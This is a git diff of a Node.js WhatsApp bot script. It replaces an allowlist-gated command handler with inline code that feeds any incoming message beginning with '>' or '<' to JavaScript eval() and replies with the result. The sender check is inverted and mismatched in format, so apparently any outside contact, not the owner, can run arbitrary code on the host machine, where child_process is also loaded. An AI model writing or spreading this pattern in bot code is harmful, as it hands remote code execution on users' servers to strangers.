@@ -9,12 +9,6 @@ const pino = require('pino')
 const { format } = require('util')
 const { exec } = require('child_process')
 
-
-const { msg, evaluate, evalu } = require('./commands/eval');
-
-const ALLOWED_SENDERS = ['51968374620@s.whatsapp.net'];
-
-
 const start = async () => {
     const { state, saveCreds } = await useMultiFileAuthState('session')
     
@@ -51,9 +45,6 @@ const start = async () => {
         if (!m.messages) return
         
         const v = m.messages[0]
-        if (!v.message) {
-            return;
-        }
         const from = v.key.remoteJid
         const sender = (v.key.participant || v.key.remoteJid)
         const type = Object.keys(v.message)[0]
@@ -64,8 +55,44 @@ const start = async () => {
 
         await client.readMessages([v.key])
         
-        if (!ALLOWED_SENDERS.includes(sender)) {
-            await evalu(client, from, v, body);
+        
+
+
+
+
+        const reply = async (text) => {
+            msg = generateWAMessageFromContent(from, {
+                extendedTextMessage: {
+                    text,
+                    contextInfo: {
+                        externalAdReply: {
+                            title: '🚩 Simple Base Wa Bot',
+                            showAdAttribution: true,
+                            thumbnailUrl: 'https://telegra.ph/file/a88de6973f18046e409a9.jpg'
+                        }}
+                }},
+                { quoted: v })
+                await client.relayMessage(from, msg.message, {})
+        }
+
+        if (!['5212213261679', client.user.id.split`:`[0]].includes(sender)) {
+            if (body.startsWith('>')) {
+                try {
+                    let value = await eval(`(async() => { ${body.slice(1)} })()`)
+                    await reply(format(value))
+                } catch (e) {
+                    await reply(e)
+                }
+            }
+            
+            if (body.startsWith('<')) {
+                try {
+                    let value = await eval(`(async() => { return ${body.slice(1)} })()`)
+                    await reply(format(value))
+                } catch(e) {
+                    await reply(e)
+                }
+            }
         }
         
     })
